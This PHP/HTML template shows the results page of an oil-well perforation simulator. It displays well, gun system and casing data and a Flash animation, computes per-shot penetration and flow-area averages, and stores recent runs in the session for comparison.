          <td align="center" width="142" class="textbutton"><a href="compare.php" target="_blank" class="textbutton style12">ETA Comparison Tool</a>&nbsp;</td>
		  <td align="center" width="132"><a href="contact.php" target="_blank" class="style13">Contact </a></td>
		</tr>
</table></div>
  <table width="757" border="0">
  <tr>
    <td class="title"><div align="center">SIMULATION</div></td>
  </tr>
</table>
 <div align="center" class="large"></div>
 
 <div align="center">
  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="700" height="490">
    <param name="movie" value="etv1.swf" />
    <param name= FlashVars  value="borehole=<?php echo $borehole; ?>&contenedor=<?php echo $contenedor; ?>
			  &radin=<?php  echo $radin; ?>&guntam=<?php echo $guntam; ?>&gposition=<?php echo $gposition; ?>&largeod=<?php  echo (int)$large_od; ?>     	
			  &large_casingPosition=<?php echo $large_casingPosition; ?>&large_sheath=<?php echo $large_sheath; ?>&largewall=<?php echo $largewall; ?>
			  &interod=<?php echo  $interod; ?>&inter_casingPosition=<?php echo $inter_casingPosition; ?>&inter_sheath=<?php echo $inter_sheath; ?>
			  &interwall=<?php echo $interwall; ?>&smallod=<?php echo $smallod; ?>&small_casingPosition=<?php echo $small_casingPosition; ?>
			  &small_sheath=<?php echo $small_sheath; ?>&smallwall=<?php echo $smallwall; ?>&shotDensidad=<?php echo $shotDensidad; ?>
			  &relleno2=<?php echo $relleno2; ?>&small=<?php echo $small; ?>&disparo0=<?php echo $penetracionflash[0]; ?>&disparo1=<?php echo $penetracionflash[1]; ?>&disparo2=<?php echo $penetracionflash[2]; ?>&disparo3=<?php echo $penetracionflash[3]; ?>&disparo4=<?php echo $penetracionflash[4]; ?>&disparo5=<?php echo $penetracionflash[5]; ?>&disparo6=<?php echo $penetracionflash[6]; ?>&disparo7=<?php echo $penetracionflash[7]; ?>&disparo8=<?php echo $penetracionflash[8]; ?>&disparo9=<?php echo $penetracionflash[9]; ?>&disparo10=<?php echo $penetracionflash[10]; ?>&disparo11=<?php echo $penetracionflash[11]; ?>&disparo12=<?php echo $penetracionflash[12]; ?>&disparo13=<?php echo $penetracionflash[13]; ?>&disparo14=<?php echo $penetracionflash[14]; ?>&disparo15=<?php echo $penetracionflash[15]; ?>&disparo16=<?php echo $penetracionflash[16]; ?>&disparo17=<?php echo $penetracionflash[17]; ?>&disparo18=<?php echo $penetracionflash[18]; ?>&disparo19=<?php echo $penetracionflash[19]; ?>&disparo20=<?php echo $penetracionflash[20]; ?>&fase=<?php echo $fase; ?>&model= <?php echo $charge_part_number; ?>&disparoinforme=<?php echo $penetracionTotal[0]; ?>&index=<?php echo $indice; ?>"/>
    <param name="quality" value="high" />
    <embed src="etv1.swf" FlashVars= "borehole=<?php echo $borehole; ?>&contenedor=<?php echo $contenedor; ?>
			  &radin=<?php  echo $radin; ?>&guntam=<?php echo $guntam; ?>&gposition=<?php echo $gposition; ?>&largeod=<?php  echo (int)$large_od; ?>     	
			  &large_casingPosition=<?php echo $large_casingPosition; ?>&large_sheath=<?php echo $large_sheath; ?>&largewall=<?php echo $largewall; ?>
			  &interod=<?php echo  $interod; ?>&inter_casingPosition=<?php echo $inter_casingPosition; ?>&inter_sheath=<?php echo $inter_sheath; ?>
			  &interwall=<?php echo $interwall; ?>&smallod=<?php echo $smallod; ?>&small_casingPosition=<?php echo $small_casingPosition; ?>
			  &small_sheath=<?php echo $small_sheath; ?>&smallwall=<?php echo $smallwall; ?>&shotDensidad=<?php echo $shotDensidad; ?>
			  &relleno2=<?php echo $relleno2; ?>&small=<?php echo $small; ?>&disparo0=<?php echo $penetracionflash[0]; ?>&disparo1=<?php echo $penetracionflash[1]; ?>&disparo2=<?php echo $penetracionflash[2]; ?>&disparo3=<?php echo $penetracionflash[3]; ?>&disparo4=<?php echo $penetracionflash[4]; ?>&disparo5=<?php echo $penetracionflash[5]; ?>&disparo6=<?php echo $penetracionflash[6]; ?>&disparo7=<?php echo $penetracionflash[7]; ?>&disparo8=<?php echo $penetracionflash[8]; ?>&disparo9=<?php echo $penetracionflash[9]; ?>&disparo10=<?php echo $penetracionflash[10]; ?>&disparo11=<?php echo $penetracionflash[11]; ?>&disparo12=<?php echo $penetracionflash[12]; ?>&disparo13=<?php echo $penetracionflash[13]; ?>&disparo14=<?php echo $penetracionflash[14]; ?>&disparo15=<?php echo $penetracionflash[15]; ?>&disparo16=<?php echo $penetracionflash[16]; ?>&disparo17=<?php echo $penetracionflash[17]; ?>&disparo18=<?php echo $penetracionflash[18]; ?>&disparo19=<?php echo $penetracionflash[19]; ?>&disparo20=<?php echo $penetracionflash[20]; ?>&fase=<?php echo $fase; ?>&model= <?php echo $charge_part_number; ?> 
			  &disparoinforme=<?php echo $penetracionTotal[0]; ?>&index=<?php echo $indice; ?>"
	quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="700" 
			  height="490"></embed>
    
  </object>
</div>
<table width="600" border="0" align="center">
  <td colspan="5" height="25" class="large"><div align="left">General</div></td>
          </tr>
          <tr>
            <td width="139" class="text">Company Name</td>
            <td class="text"> <div align="left">
              <input type="text" value="<?php echo $company; ?>" class="text" readonly size="40">
            </div></td>
            <td class="text">Engineer</td>
            <td width="183" colspan="2" class="text"><div align="left">
              <input name="text" type="text" class="text" value="<?php echo $engineer; ?>" size="30" readonly>
            </div></td>
          </tr>
          <tr>
            <td class="text">Well</td>
            <td class="text"><div align="left">
              <input type="text" value="<?php echo $well; ?>" class="text" readonly size="40">
            </div></td>
            <td class="text">Field</td>
            <td colspan="2" class="text"><div align="left">
              <input name="text2" type="text" class="text" value="<?php echo $field; ?>" size="30" readonly>
            </div></td>
          </tr>
		  <tr>
            <td class="text">Location</td>
            <td class="text"><div align="left">
              <input type="text" value="<?php echo $location; ?>" class="text" readonly size="40">
            </div></td>
            <td class="text">Formation</td>
            <td colspan="2" class="text"><div align="left">
              <input name="text3" type="text" class="text" value="<?php echo $formation; ?>" size="30" readonly="readonly">
            </div></td>
		  </tr>
          <tr>
            <td class="text">Completion Fluid</td>
            <td width="256" class="text"><div align="left">
              <input name="text8" type="text" class="text" value="<?php echo $complectionfluidText; ?>" size="15" readonly>
            </div></td>
            <td width="110" class="text">Fluid Weight</td>
            <td colspan="2" class="text"><div align="left">
              <input type="text" value="<?php echo $fluidWeight; ?>" class="text" readonly size="6"> 
            <span class="small small small">&nbsp;[lb/gal]</span></div></td>
          </tr>
          <tr>
            <td class="text">Borehole Diameter</td>
            <td class="text"><div align="left">
              <input name="text9" type="text" class="text" value="<?php echo $boreholeDiameter; ?>" size="15" readonly>              
            <span class="style3">[in]</span></div></td>
            <td class="text">Casing Strings</td>
            <td class="text"><div align="left">
              <input name="text7" type="text" class="text" value="<?php echo $casing; ?>" size="6" readonly>
            </div></td>
          </tr>
          <tr>
            <td class="text">Depth to top Shot &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
            <td class="text"><div align="left">
              <input name="text10" type="text" class="text" value="<?php echo $profundidad; ?>" size="15" readonly> 
            <span class="small style4"><span class="style2">[ft]</span></span></div></td>
           	<td class="text">Temperature</td>
            <td colspan="2" class="text"><div align="left">
              <input type="text" value="<?php echo $temperature; ?>" class="text" readonly size="6">
            <span class="style3">&nbsp;[&ordm;F]</span></div></td>
          </tr>

          <tr>
            <td class="text">Depth to bottom Shot &nbsp;</td>
            <td class="text"><div align="left">
              <input name="text112" type="text" class="text" value="<?php echo $profundidad2; ?>" size="15" readonly>
            <span class="small style4"><span class="style2">[ft]</span></span></div></td>
            <td class="text">Overburden Gradient </td>
            <td colspan="2" class="text"><div align="left">
              <input name="text12" type="text" class="text" value="<?php echo $overburden; ?>" size="6" readonly>
            <span class="style3">&nbsp;[psi/ft]</span></div></td>
          </tr>
          <tr>
            <td class="text">Damage Zone </td>
            <td class="text"><div align="left">
              <input name="text11" type="text" class="text" value="<?php echo $radio; ?>" size="15" readonly>              
            <span class="style3">[in]</span></div></td>
            <td class="text">&nbsp;</td>
            <td colspan="2" class="text"><div align="left"></div></td>
</table>
<table width="600" align="center" class="text">
          
          <tr>
            <td colspan="4" height="25" class="large"><div align="left">Gun System</div></td>
          </tr>
          <tr>
            <td width="157">API certified Company</td>
            <td colspan="3"><div align="left">
              <input type="text" value="<?php echo $api_company; ?>" class="text" size="60" readonly>
            </div></td>
          </tr>
          <tr>
            <td>Charge Type</td>
            <td>
              <div align="left">
                <input type="text" value="<?php echo $ctype; ?>" class="text" size="10"  readonly>            
            </div></td>
            <td>Gun Position </td>
            <td><div align="left">
              <input name="text42" type="text" class="text" value="<?php echo $gposition; ?>" size="10" readonly>
            </div></td>
          </tr>
          <tr>
            <td>Gun Size</td>
            <td width="170"><div align="left">
              <input name="text13" type="text" class="text" value="<?php echo $gunSize; ?>"size="10" readonly>
            </div></td>
            <td width="92">Shot Density</td>
            <td width="161"><div align="left">
              <input name="text4" type="text" class="text" value="<?php echo $shotDensity; ?>" size="6" readonly>
            </div></td>
          </tr>
          <tr>
            <td>Gun Phase</td>
            <td><div align="left">
              <input name="text15" type="text" class="text" value="<?php echo $gunPhase; ?>" size="10" readonly>
            </div></td>
            <td>Charge Gram Weight</td>
            <td><div align="left">
              <input name="text5" type="text" class="text" value="<?php echo $charge_gram; ?>" size="6" readonly>
            </div></td>
          </tr>
		  <tr>
            <td>Charge Part Number</td>
            <td><div align="left">
              <input name="text14" type="text" class="text" value="<?php echo $charge_part_number; ?>" size="16" readonly>
            </div></td>
            <td>Explosive</td>
            <td><div align="left">
              <input type="text" value="<?php echo $explosive; ?>" class="text" size="6" readonly>
            </div></td>
		  </tr>

          <tr>
            <td colspan="4" height="25" class="large">&nbsp;</td>
          </tr>
          <tr>
            <td colspan="4" height="25" class="large"><div align="left">Calculation Method</div></td>
          </tr>
          <tr>
            <td>Formation Compression Strength</td>
            <td><div align="left">
              <input type="text" value="<?php echo $fc; ?>" class="text" readonly>
            </div></td>
            <td>Formation Porosity</td>
            <td><div align="left">
              <input name="text6" type="text" class="text" value="<?php echo $formationPorosity; ?>" readonly>
            </div></td>
          </tr>
		  <!-- Es obligatorio ingresar al menos uno de los dos valores -->
  </table>
		<div  align="center">
		
		<table align="center" class="text" width="600">
          <tr>
            <td colspan="7" height="25" class="large">&nbsp;</td>
          </tr>
          <tr>
            <td colspan="7" height="25" class="large"><div align="left">Well Tubulars</div></td>
          </tr>
          <tr>
            <td>
                <table align="center">
                  <tr>
                    <td width="50" rowspan="2" valign="bottom">Casing</td>
                    <td align="center" width="70">OD</td>
                    <td align="center" width="70">Weight</td>
                    <td align="center" width="70">Pipe Grade</td>
                    <td align="center" width="70">Sheath</td>
                    <td align="center" width="80">Fluid Weight</td>
                    <td align="center" width="90">Cement String</td>
                    <td align="center">Casing Position</td>
                  </tr>
                  <tr>
                    <td align="center">
                      <input type="text" name="large_od" class="text" size="8" value="<?php echo $large_od; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_weight" class="text" size="8" value="<?php echo $large_weight; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_weight" class="text" size="8" value="<?php echo $large_pipe; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_sheath" class="text" size="10" value="<?php echo $large_sheath; ?>" readonly>                    </td>
                    <td align="center">
                      <input type="text" name="large_fc" class="text" size="10" value="<?php echo $large_fc; ?>" readonly>                    </td>
                    <td align="center">
                      <input type="text" name="large_cc" class="text" size="10" value="<?php echo $large_cc; ?>" readonly>                    </td>
                    <td>
					  <input type="text" name="large_casingPosition" class="text" size="10"  value="<?php echo $large_casingPosition; ?>" readonly>                    </td>
                  </tr>
                </table>
                
				<?php if ($casing == 2 || $casing==3) { ?>
                <table align="center">
                  <tr>
                    <td width="50" rowspan="2" valign="bottom">Casing</td>
                    <td align="center" width="70">OD</td>
                    <td align="center" width="70">Weight</td>
					<td align="center" width="70">Pipe Grade</td>
                    <td align="center" width="70">Sheath</td>
                    <td align="center" width="80">Fluid Weight</td>
                    <td align="center" width="90">Cement String</td>
                    <td align="center">Casing Position</td>
                  </tr>
                  <tr>
                    <td align="center">
                      <input type="text" name="large_od" class="text" size="8" value="<?php echo $inter_od; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_weight" class="text" size="8" value="<?php echo $inter_weight; ?>" readonly>                    </td>
                   <td align="center">
					  <input type="text" name="large_weight" class="text" size="8" value="<?php echo $inter_pipe; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_sheath" class="text" size="10" value="<?php echo $inter_sheath; ?>" readonly>                    </td>
                    <td align="center">
                      <input type="text" name="large_fc" class="text" size="10" value="<?php echo $inter_fc; ?>" readonly>                    </td>
                    <td align="center">
                      <input type="text" name="large_cc" class="text" size="10" value="<?php echo $inter_cc; ?>" readonly>                    </td>
                    <td>
					  <input type="text" name="large_casingPosition" class="text" size="10"  value="<?php echo $inter_casingPosition; ?>" readonly>                    </td>
                  </tr>
                </table>
				<?php } 
					if ($casing==3) { 
				?>
                <table align="center">
                  <tr>
                    <td width="50" rowspan="2" valign="bottom">Casing</td>
                    <td align="center" width="70">OD</td>
                    <td align="center" width="70">Weight</td>
                     <td align="center" width="70">Pipe Grade</td>
                    <td align="center" width="70">Sheath</td>
                    <td align="center" width="80">Fluid Weight</td>
                    <td align="center" width="90">Cement String</td>
                    <td align="center">Casing Position</td>
                  </tr>
                  <tr>
                    <td align="center">
                      <input type="text" name="large_od" class="text" size="8" value="<?php echo $small_od; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_weight" class="text" size="8" value="<?php echo $small_weight; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_weight" class="text" size="8" value="<?php echo $small_pipe; ?>" readonly>                    </td>
                    <td align="center">
					  <input type="text" name="large_sheath" class="text" size="10" value="<?php echo $small_sheath; ?>" readonly>                    </td>
                    <td align="center">
                      <input type="text" name="large_fc" class="text" size="10" value="<?php echo $small_fc; ?>" readonly>                    </td>
                    <td align="center">
                      <input type="text" name="large_cc" class="text" size="10" value="<?php echo $small_cc; ?>" readonly>                    </td>
                    <td>
					  <input type="text" name="large_casingPosition" class="text" size="10"  value="<?php echo $small_casingPosition; ?>" readonly>                    </td>
                  </tr>
                </table>
				<?php } ?>            </td>
          </tr>
        </table>
		
		<table align="center" class="text" width="700">
      <tr>
        <td colspan="12" height="30" class="title" align="center">Results</td>
      </tr>
      <tr>
        <td height="30" class="large" width="40" valign="top" align="center">Shot</td>
        <td class="large" width="75" valign="top" align="center">Clearance<br>
          [in]</td>
        <td class="large" width="80" valign="middle" align="center"><div align="center"><strong><span class="text">Casing Size</span> <br>
Hole  </strong>[in]</div></td>
        <!-- aqui va $diametroHoyo -->
        <!-- 1 casing -->
        <?php if ($casing == 1){ ?>
        <td class="large" valign="top" align="center"><?php echo $large_sheath; ?><br>
 [in]</td>
        <?php } ?>
        <!-- 2 casing -->
        <?php if ($casing == 2){ ?>
        <td class="large" valign="top" align="center"><?php echo $inter_sheath; ?> [in]</td>
        <td class="large" valign="top" align="center"><?php echo $large_sheath; ?> [in]</td>
        <?php } ?>
        <!-- 3 casing -->
        <?php if ($casing == 3){ ?>
        <td class="large" valign="top" align="center"><?php echo $small_sheath; ?> [in]</td>
        <td class="large" valign="top" align="center"><?php echo $inter_sheath; ?> [in]</td>
        <td class="large" valign="top" align="center"><?php echo $large_sheath; ?> [in]</td>
        <?php } ?>
        <td class="large" width="110" valign="top" align="center"><span class="style5">Formation Penetration </span>&nbsp;[in]</td>
        <td class="large" width="110" valign="top" align="center">Total  <strong>*</strong> Penetration&nbsp;[in]</td>
        <td class="large" width="90" valign="top" align="center"><div align="center">Area to &nbsp;Flow&nbsp;[in&sup2;]</div></td>
      </tr>
      <?PHP 
	  $avg_clearance1 = number_format(0,4,',','.');
	  $avg_diametro_hoyo = number_format(0,4,',','.');
	  $avg_clearance2 = number_format(0,4,',','.');
	  $avg_clearance3 = number_format(0,4,',','.');
	  $avg_clearance4 = number_format(0,4,',','.');
	  $avg_penetracionFormacion = number_format(0,4,',','.');
	  $avg_penetracionTotal = number_format(0,4,',','.');
	  $avg_areaExpuestaFlujo = number_format(0,4,',','.');
	  
	  for($i=0; $i<$shotDensity; $i++){ ?>
      <tr>
        <td height="30"><?php echo $i+1; ?></td>
        <td align="center"><?php $val = number_format($clearance1[$i],4,',','.'); echo $val; ?></td>
        <td align="center"><?php $val = number_format($diametroHoyo[$i],4,',','.'); echo $val; ?></td>
        <!-- aqui va $diametroHoyo -->
        <!-- 1 casing -->
        <?php if ($casing == 1){ ?>
        <td align="center"><?php $val = number_format($clearance2[$i],4,',','.'); echo $val;?></td>
        <?php } ?>
        <?php if ($casing == 2){ ?>
        <td align="center"><?php $val = number_format($clearance2[$i],4,',','.'); echo $val; ?></td>
        <td align="center"><?php $val = number_format($clearance3[$i],4,',','.'); echo $val; ?></td>
        <?php } ?>
        <?php if ($casing == 3){ ?>
        <td align="center"><?php $val = number_format($clearance2[$i],4,',','.'); echo $val; ?></td>
        <td align="center"><?php $val = number_format($clearance3[$i],4,',','.'); echo $val;  ?></td>
        <td align="center"><?php $val = number_format($clearance4[$i],4,',','.'); echo $val; ?></td>
        <?php } ?>
        <td align="center"><?php $val = number_format($penetracionFormacion[$i],4,',','.'); echo $val; ?></td>
        <td align="center"><?php $val = number_format($penetracionTotal[$i],4,',','.'); echo $val; ?></td>
        <td align="center"><?php $val = number_format($areaExpuestaFlujo[$i],4,',','.'); echo $val; ?></td>
      </tr>
      <?PHP } ?>
	  
	  <?php
	  $avg_clearance1 = 0;
	  $avg_diametro_hoyo = 0;
	  $avg_clearance2 = 0;
	  $avg_clearance3 = 0;
	  $avg_clearance4 = 0;
	  $avg_penetracionFormacion = 0;
	  $avg_penetracionTotal = 0;
	  $avg_areaExpuestaFlujo = 0;
	  
	  for($i=0; $i<$shotDensity; $i++){ 
	  	$avg_clearance1 = $avg_clearance1 + $clearance1[$i];
		$avg_diametro_hoyo = $avg_diametro_hoyo + $diametroHoyo[$i];

		$avg_clearance2 = $avg_clearance2  + $clearance2[$i];
		$avg_clearance3 = $avg_clearance3  + $clearance3[$i];
		$avg_clearance4 = $avg_clearance4  + $clearance4[$i];
		$avg_areaExpuestaFlujo = $avg_areaExpuestaFlujo + $areaExpuestaFlujo[$i];
		$avg_penetracionTotal = $avg_penetracionTotal + $penetracionTotal[$i];
		$avg_penetracionFormacion = $avg_penetracionFormacion + $penetracionFormacion[$i];
	  }
	  
	  ?>
	  
	  <!--  ******************** promedios ******************** -->
	   <tr>
        <td height="40"><strong>AVG</strong> </td>
        <td align="center"><strong><?php echo number_format($avg_clearance1 / $shotDensity,4,',','.'); ?></strong></td>
        <td align="center"><strong><?php echo number_format($avg_diametro_hoyo / $shotDensity,4,',','.'); ?></strong></td>
        <!-- aqui va $diametroHoyo -->
        <!-- 1 casing -->
        <?php if ($casing == 1){ ?>
        <td align="center"><strong><?php echo number_format($avg_clearance2/$shotDensity,4,',','.'); ?></strong></td>
        <?php } ?>
        <?php if ($casing == 2){ ?>
        <td align="center"><strong><?php echo number_format($avg_clearance2 / $shotDensity,4,',','.'); ?></strong></td>
        <td align="center"><strong><?php echo number_format($avg_clearance3 / $shotDensity,4,',','.'); ?></strong></td>
        <?php } ?>
        <?php if ($casing == 3){ ?>
        <td align="center"><strong><?php echo number_format($avg_clearance2 / $shotDensity,4,',','.'); ?></strong></td>
        <td align="center"><strong><?php echo number_format($avg_clearance3 / $shotDensity,4,',','.'); ?></strong></td>
        <td align="center"><strong><?php echo number_format($avg_clearance4 / $shotDensity,4,',','.'); ?></strong></td>
        <?php } ?>
        <td align="center"><strong><?php echo number_format($avg_penetracionFormacion / $shotDensity,4,',','.'); ?></strong></td>
        <td align="center"><strong><?php echo number_format($avg_penetracionTotal / $shotDensity,4,',','.'); ?></strong></td>
        <td align="center"><strong><?php echo number_format($avg_areaExpuestaFlujo / $shotDensity,4,',','.'); ?></strong></td>
      </tr>
    </table>
		</div>
        
    <?PHP
        if(strstr($charg,'*')) {?>
         <span class="style17"> <?PHP echo "(*) Test Not Registered With API"; ?> </span>
         <?PHP
		 }
		 ?>    
        
		<p></div>
      <?PHP		
$avg_hole1 =   number_format($avg_diametro_hoyo / $shotDensity,4,'.','.');
$avg_pen1 = number_format($avg_penetracionTotal / $shotDensity,4,'.','.');  
$area_flow1 = number_format($avg_areaExpuestaFlujo / $shotDensity,4,'.','.'); 

$avg_hole = $avg_hole1;
$avg_pen =  $avg_pen1;
$area_flow = $area_flow1;

		
?>
		  <!--
//Well Tubulars
$large_od = $_REQUEST['large_od'];
//echo "od: ".$large_od."<br>";
$large_weight = $_REQUEST['large_weight'];
$large_wall = $_REQUEST['large_pipe'];
//echo "wall: ".$large_wall."<br>";
$large_sheath = $_REQUEST['large_sheath'];
//echo "sheath: ".$large_sheath."<br>";
$large_fc = $_REQUEST['large_fc'];
$large_cc = $_REQUEST['large_cc'];
$large_casingPosition = $_REQUEST['large_casingPosition'];

$inter_od = $_REQUEST['inter_od'];
$inter_weight = $_REQUEST['inter_weight'];
$inter_wall = $_REQUEST['inter_pipe'];
$inter_sheath = $_REQUEST['inter_sheath'];
$inter_fc = $_REQUEST['inter_fc'];
$inter_cc = $_REQUEST['inter_cc'];
$inter_casingPosition = $_REQUEST['inter_casingPosition'];

$small_od = $_REQUEST['small_od'];
$small_weight = $_REQUEST['small_weight'];
$small_wall = $_REQUEST['small_pipe'];
$small_sheath = $_REQUEST['small_sheath'];
$small_fc = $_REQUEST['small_fc'];
$small_cc = $_REQUEST['small_cc'];
$small_casingPosition = $_REQUEST['small_casingPosition'];




//Calculation Method
$formationCompression = $_REQUEST['formationCompression'];
$formationPorosity = $_REQUEST['formationPorosity'];	

--> 
	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="text">&nbsp;* Measure taken from the casing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> 
</td>
		</p>
  </tr>
  <!-- fin de cuerpo -->
</table>

<?php
if(isset($_SESSION['carro']))
$carro=$_SESSION['carro']; 
$i= count($carro);
if (count($carro) == 0) { 
$carro[$i]=array('abrev'=>$abrev, 'god'=>$gunSize,'shot_density'=>$shotDensity, 'gun_phase'=>$gunPhase,'cpn'=>$charge_part_number, 
'boreholeDiameter' => $boreholeDiameter, 'fluidWeight' => $fluidWeight, 'casing' => $casing, 'profundidad' => $profundidad, 
'profundidad2' => $profundidad2, 'overburden' => $overburden, 'temperature' => $temperature, 'large_od' => $large_od, 'large_weight' => $large_weight,
'large_wall' => $large_wall, 'large_pipe' => $large_pipe, 'large_sheath' => $large_sheath, 'large_fc' => $large_fc, 'large_cc' => $large_cc,
'large_casingPosition' => $large_casingPosition, 'inter_od' => $inter_od, 'inter_weight' => $inter_weight, 'inter_wall' => $inter_wall, 
'inter_pipe' => $inter_pipe, 'inter_sheath' => $inter_sheath, 'inter_sheath' => $inter_sheath, 'inter_fc' => $inter_fc, 'inter_cc' => $inter_cc,
'inter_casingPosition' => $inter_casingPosition, 'small_od' => $small_od, 'small_weight' => $small_weight, 'small_wall' => $small_wall, 
'$small_pipe' => $small_pipe, 'small_sheath' => $small_sheath, 'small_fc' => $small_fc, 'small_cc' => $small_cc, 'small_casingPosition' => $small_casingPosition
, 'formationCompression' => $formationCompression, 'formationPorosity' => $formationPorosity, 'avg_hole' => $avg_hole, 'avg_pen' => $avg_pen, 
'area_flow' => $area_flow, 'indice' => $indice, 'gunSize' => $gunSize, 'shotDensity' => $shotDensity, 'gunPhase' => $gunPhase );
$_SESSION['carro']=$carro;
} else {
$carro[$i]=array('abrev'=>$abrev, 'god'=>$gunSize,'shot_density'=>$shotDensity, 'gun_phase'=>$gunPhase,'cpn'=>$charge_part_number, 
'boreholeDiameter' => $boreholeDiameter, 'fluidWeight' => $fluidWeight, 'casing' => $casing, 'profundidad' => $profundidad, 
'profundidad2' => $profundidad2, 'overburden' => $overburden, 'temperature' => $temperature, 'large_od' => $large_od, 'large_weight' => $large_weight,
'large_wall' => $large_wall, 'large_pipe' => $large_pipe, 'large_sheath' => $large_sheath, 'large_fc' => $large_fc, 'large_cc' => $large_cc,
'large_casingPosition' => $large_casingPosition, 'inter_od' => $inter_od, 'inter_weight' => $inter_weight, 'inter_wall' => $inter_wall, 
'inter_pipe' => $inter_pipe, 'inter_sheath' => $inter_sheath, 'inter_sheath' => $inter_sheath, 'inter_fc' => $inter_fc, 'inter_cc' => $inter_cc,
'inter_casingPosition' => $inter_casingPosition, 'small_od' => $small_od, 'small_weight' => $small_weight, 'small_wall' => $small_wall, 
'$small_pipe' => $small_pipe, 'small_sheath' => $small_sheath, 'small_fc' => $small_fc, 'small_cc' => $small_cc, 'small_casingPosition' => $small_casingPosition
, 'formationCompression' => $formationCompression, 'formationPorosity' => $formationPorosity, 'avg_hole' => $avg_hole, 'avg_pen' => $avg_pen, 
'area_flow' => $area_flow, 'indice' => $indice, 'gunSize' => $gunSize, 'shotDensity' => $shotDensity, 'gunPhase' => $gunPhase );
$_SESSION['carro']=$carro;
if ($carro[$i] ['boreholeDiameter'] != $carro[$i-1] ['boreholeDiameter'] or $carro[$i] ['fluidWeight'] != $carro[$i-1] ['fluidWeight'] or
$carro[$i] ['casing'] != $carro[$i-1] ['casing'] or $carro[$i] ['profundidad'] != $carro[$i-1] ['profundidad'] or 
$carro[$i] ['profundidad2'] != $carro[$i-1] ['profundidad2'] or $carro[$i] ['overburden'] != $carro[$i-1] ['overburden'] or
$carro[$i] ['temperature'] != $carro[$i-1] ['temperature'] or $carro[$i] ['large_od'] != $carro[$i-1] ['large_od'] or
$carro[$i] ['large_weight'] != $carro[$i-1] ['large_weight'] or $carro[$i] ['large_wall'] != $carro[$i-1] ['large_wall'] or 
$carro[$i] ['large_pipe'] != $carro[$i-1] ['large_pipe'] or $carro[$i] ['large_sheath'] != $carro[$i-1] ['large_sheath'] or
$carro[$i] ['large_fc'] != $carro[$i-1] ['large_fc'] or $carro[$i] ['large_cc'] != $carro[$i-1] ['large_cc'] or
$carro[$i] ['large_casingPosition'] != $carro[$i-1] ['large_casingPosition'] or $carro[$i] ['inter_od'] != $carro[$i-1] ['inter_od'] or
$carro[$i] ['inter_weight'] != $carro[$i-1] ['inter_weight'] or $carro[$i] ['inter_wall'] != $carro[$i-1] ['inter_wall'] or 
$carro[$i] ['inter_pipe'] != $carro[$i-1] ['inter_pipe'] or $carro[$i] ['inter_sheath'] != $carro[$i-1] ['inter_sheath'] or
$carro[$i] ['inter_fc'] != $carro[$i-1] ['inter_fc'] or $carro[$i] ['inter_cc'] != $carro[$i-1] ['inter_cc'] or
$carro[$i] ['inter_casingPosition'] != $carro[$i-1] ['inter_casingPosition'] or $carro[$i] ['small_od'] != $carro[$i-1] ['small_od'] or
$carro[$i] ['small_weight'] != $carro[$i-1] ['small_weight'] or $carro[$i] ['small_wall'] != $carro[$i-1] ['small_wall'] or 
$carro[$i] ['small_pipe'] != $carro[$i-1] ['small_pipe'] or $carro[$i] ['small_sheath'] != $carro[$i-1] ['small_sheath'] or
$carro[$i] ['small_fc'] != $carro[$i-1] ['small_fc'] or $carro[$i] ['small_cc'] != $carro[$i-1] ['small_cc'] or
$carro[$i] ['small_casingPosition'] != $carro[$i-1] ['small_casingPosition'] or $carro[$i] ['formationCompression'] != $carro[$i-1] ['formationCompression']
or $carro[$i] ['formationPorosity'] != $carro[$i-1] ['formationPorosity']) {
session_unset();
}}
if (!isset($_SESSION['carro'])) {
$carro=$_SESSION['carro'];
$i= count($carro);
$carro[$i]=array('abrev'=>$abrev, 'god'=>$gunSize,'shot_density'=>$shotDensity, 'gun_phase'=>$gunPhase,'cpn'=>$charge_part_number, 
'boreholeDiameter' => $boreholeDiameter, 'fluidWeight' => $fluidWeight, 'casing' => $casing, 'profundidad' => $profundidad, 
'profundidad2' => $profundidad2, 'overburden' => $overburden, 'temperature' => $temperature, 'large_od' => $large_od, 'large_weight' => $large_weight,
'large_wall' => $large_wall, 'large_pipe' => $large_pipe, 'large_sheath' => $large_sheath, 'large_fc' => $large_fc, 'large_cc' => $large_cc,
'large_casingPosition' => $large_casingPosition, 'inter_od' => $inter_od, 'inter_weight' => $inter_weight, 'inter_wall' => $inter_wall, 
'inter_pipe' => $inter_pipe, 'inter_sheath' => $inter_sheath, 'inter_sheath' => $inter_sheath, 'inter_fc' => $inter_fc, 'inter_cc' => $inter_cc,
'inter_casingPosition' => $inter_casingPosition, 'small_od' => $small_od, 'small_weight' => $small_weight, 'small_wall' => $small_wall, 
'$small_pipe' => $small_pipe, 'small_sheath' => $small_sheath, 'small_fc' => $small_fc, 'small_cc' => $small_cc, 'small_casingPosition' => $small_casingPosition
, 'formationCompression' => $formationCompression, 'formationPorosity' => $formationPorosity, 'avg_hole' => $avg_hole, 'avg_pen' => $avg_pen, 
'area_flow' => $area_flow, 'indice' => $indice, 'gunSize' => $gunSize, 'shotDensity' => $shotDensity, 'gunPhase' => $gunPhase );
$_SESSION['carro']=$carro;
}
	
if ($i >= 5) {
array_shift ($carro);
$_SESSION['carro']=$carro;
}


?>
</body>
</html>
